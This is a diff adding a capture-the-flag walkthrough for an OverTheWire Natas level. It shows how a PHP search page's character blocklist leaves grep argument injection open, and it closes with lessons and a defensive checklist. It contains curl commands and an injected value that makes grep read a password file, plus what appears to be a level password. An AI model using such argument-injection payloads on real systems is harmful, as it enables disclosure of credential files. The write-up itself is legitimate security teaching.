@@ -691,6 +691,125 @@ With this I got the password for natas10 and could move on to the next level.
 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 -->
 
+
+## Level 10 → Level 11
+
+### Level goal
+
+Read the password for `natas11` by bypassing a character filter that blocks common command injection metacharacters.  
+What you should learn: 
+how input validation can block *some* injection vectors but still leave grep argument injection wide open, 
+and how to abuse grep's ability to search multiple files.
+
+### Short explanation of the vulnerability
+
+The page still uses `passthru("grep -i $key dictionary.txt")` like Level 9, 
+but now it filters the input with a regex: `/[;|&]/`.  
+That blocks semicolons, pipes, and ampersands — the usual shell command chaining characters.  
+
+But the filter doesn't block **spaces**.  
+That means we can't chain commands, but we *can* add extra arguments to grep itself.  
+Since grep accepts multiple file paths, we can tell it to search both `dictionary.txt` *and* `/etc/natas_webpass/natas11` in a single command.
+
+The trick: craft a needle that will match something in both files. 
+The letter `a` appears in the password file (and nearly everything else), 
+so grep will return matches from both files and print them with their filenames prefixed.
+
+### Step-by-step (what I ran and what the server returned)
+
+**1) Inspect the page**
+```bash
+curl -u natas10:natas10password http://natas10.natas.labs.overthewire.org/
+```
+
+Server response (relevant part):
+```html
+<h1>natas10</h1>
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+Output:
+<pre>
+</pre>
+```
+
+Observation: the page warns about filtering. Time to check the source.
+
+**2) Fetch the source to see the filter**
+```bash
+curl -u natas10:natas10password http://natas10.natas.labs.overthewire.org/index-source.html
+```
+
+Source (cleaned and extracted):
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+Observation: 
+The regex `/[;|&]/` blocks semicolons, pipes, and ampersands.  
+But it doesn't block spaces, so we can still inject additional arguments to grep.  
+The command becomes: `grep -i [our_input] dictionary.txt`  
+If we submit `a /etc/natas_webpass/natas11`, grep expands that to:  
+`grep -i a /etc/natas_webpass/natas11 dictionary.txt`  
+Grep will search for `a` in both files and print matching lines with filenames.
+
+**3) Exploit grep argument injection to read the password**
+```bash
+curl -u natas10:natas10password -d "needle=a /etc/natas_webpass/natas11" http://natas10.natas.labs.overthewire.org/
+```
+
+Server response (relevant part):
+```html
+Output:
+<pre>
+/etc/natas_webpass/natas11:natas11password
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+dictionary.txt:Allah's
+dictionary.txt:American
+...
+</pre>
+```
+
+### Lessons learned (concise)
+
+- Blocking shell metacharacters (`; | &`) stops command chaining, but doesn't prevent argument injection.  
+- If user input is inserted into a command that accepts multiple arguments or files, an attacker can add their own.  
+- Grep's multi-file support turns this into trivial file disclosure. Any character likely to appear in both files works as the search pattern.  
+- Real protection requires either escaping *all* input properly, using parameterized execution (no shell), or strict allowlisting.
+
+### Quick defensive checklist for admins
+
+- Don't rely on blocklists for shell input. Attackers will find what you missed.  
+- Avoid shelling out with user data. Use safe APIs or exec arrays that don't invoke a shell.  
+- If grep or similar utilities must run with user input, validate against a strict allowlist and use `escapeshellarg()`.  
+- Run the web process with minimal privileges and restrict file access with proper permissions.
+
+---
+
+<!--
+UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+-->
+
 ## Level 10 → Level 11
 ## Level 11 → Level 12
 ## Level 12 → Level 13
